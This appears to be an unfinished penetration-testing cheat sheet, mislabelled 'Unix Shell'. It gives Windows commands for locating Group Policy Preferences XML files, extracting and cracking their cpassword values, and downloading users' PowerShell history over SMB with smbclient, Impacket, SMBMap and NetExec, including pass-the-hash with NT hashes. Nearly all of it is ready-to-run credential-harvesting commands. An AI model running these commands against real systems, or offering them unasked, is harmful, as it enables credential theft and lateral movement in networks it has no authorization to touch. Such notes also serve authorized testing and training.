# Unix Shell

TODO: Convert it

Use the `dir` command to find the XML file.

```
C:\> dir /s Groups.xml

C:\> findstr /s cpassword %LOGONSERVER%\sysvol\*.xml
```

Copy the **cpassword** attribute after you've opened the XML file. Then decrypt it using `gpp-decrypt` utility or any other password cracking programs that is highly recommended like **Hashcat** or **John The Ripper**.

```
C:\> type C:\path\to\GPP_file.xml
```

smbclient

smbclient.py

smbmap

netexec

## 01 - Samba Suite Utils

```
smb: \> more /Users/<username>/AppData/Roaming/Microsoft/Windows/Powershell/PSReadLine/ConsoleHost_history.txt

smb: \> get /Users/<username>/AppData/Roaming/Microsoft/Windows/Powershell/PSReadLine/ConsoleHost_history.txt
```

## 02 - Impacket

```
$ smbclient.py

$ smbclient.py
```

Retrieve text file.

```
# get Users\<username>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadLine\ConsoleHost_history.txt
```

## 03 - SMBMap

```
$ smbmap -u "<username>" -p "<password | nt_hash>" [-d <domain>] -H <IP> --download "C$\Users\<username>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadLine\ConsoleHost_history.txt"
```

## 04 - NetExec

```
$ netexec smb -u "<username>" -p "<password>" [-d <domain> | --local-auth] --get-file /Users/<username>/AppData/Roaming/Microsoft/Windows/Powershell/PSReadLine/ConsoleHost_history.txt powershell_history.txt

$ netexec smb -u "<username>" -H "<nt_hash>" [-d <domain> | --local-auth] --get-file /Users/<username>/AppData/Roaming/Microsoft/Windows/Powershell/PSReadLine/ConsoleHost_history.txt powershell_history.txt
```